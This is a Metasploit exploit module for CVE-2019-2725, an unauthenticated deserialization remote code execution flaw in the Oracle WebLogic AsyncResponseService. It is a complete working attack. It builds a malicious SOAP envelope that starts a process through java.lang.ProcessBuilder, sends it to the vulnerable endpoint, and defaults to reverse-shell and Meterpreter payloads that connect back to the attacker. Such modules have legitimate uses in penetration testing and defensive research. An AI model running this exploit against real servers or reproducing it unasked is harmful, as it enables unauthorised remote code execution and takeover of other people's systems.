##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Oracle Weblogic Server Deserialization RCE - AsyncResponseService ',
      'Description' => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        can send a malicious SOAP request to the WLS AsyncResponseService interface
        to execute code on the vulnerable host.
      },
      'Author' =>
        [
          'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2019-2725'],
          ['CNVD-C', '2019-48814'],
          ['URL', 'http://www.cnvd.org.cn/webinfo/show/4999'],
          ['URL', 'https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html']
        ],
      'Privileged' => false,
      'Platform' => %w{ unix win solaris },
      'Targets' =>
        [
          [ 'Unix',
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          ],
          [ 'Windows',
            'Platform' => 'win',
            'Payload' => {},
            'Arch' => [ARCH_X64, ARCH_X86],
            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}
          ],
          [ 'Solaris',
            'Platform' => 'solaris',
            'Arch' => ARCH_CMD,
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},
            'Payload' => {
              'Space'       => 2048,
              'DisableNops' => true,
              'Compat'      =>
                {
                  'PayloadType' => 'cmd',
                  'RequiredCmd' => 'generic perl telnet',
                }
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'WfsDelay' => 12
        },
      'DisclosureDate' => 'Apr 23 2019'))

    register_options(
      [
        Opt::RPORT(7001),
        OptString.new('URIPATH', [true, 'URL to the weblogic instance', '']),
        OptString.new('WSPATH', [true, 'URL to AsyncResponseService', '/_async/AsyncResponseService'])
      ]
    )
  end
  
  def create_soap_payload(xml_cmd, param_cmd, payload)
    <<~EOF
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                        xmlns:wsa="http://www.w3.org/2005/08/addressing"
                        xmlns:asy="http://www.bea.com/async/AsyncResponseService">
        <soapenv:Header>
          <wsa:Action>#{rand_text_alphanumeric(20)}</wsa:Action>
          <wsa:RelatesTo>#{rand_text_alphanumeric(20)}</wsa:RelatesTo>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>#{xml_cmd}</string>
                </void>
                <void index="1">
                  <string>#{param_cmd}</string>
                </void>
                <void index="2">
                  <string>#{payload.encode(xml: :text)}</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
          <asy:onAsyncDelivery/>
        </soapenv:Body>
      </soapenv:Envelope>
    EOF
  end

  def send_payload
    uri = normalize_uri(datastore['WSPATH'])

    print_status("Generating payload...")
    # payload creation
    case target.name
    when 'Windows'
      xml_cmd = "cmd.exe"
      param_cmd = "/c"
      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encoded: false })
    when 'Unix', 'Solaris'
      xml_cmd = "/bin/bash"
      param_cmd = "-c"
      shell_payload = payload.encoded
    end

    print_status("[#{uri}] Sending payload...")
    soap_payload = create_soap_payload(xml_cmd, param_cmd, shell_payload)

    res = send_request_cgi(
      'uri'      => uri,
      'method'   => 'POST',
      'ctype'    => 'text/xml',
      'data'     => soap_payload,
      'headers'  => {'SOAPAction' => '' }
    )

    if res && res.code != 202
      print_error("Failed to exploit the vulnerability on #{uri}")
      return
    end
  end

  def exploit
    send_payload
  end
end
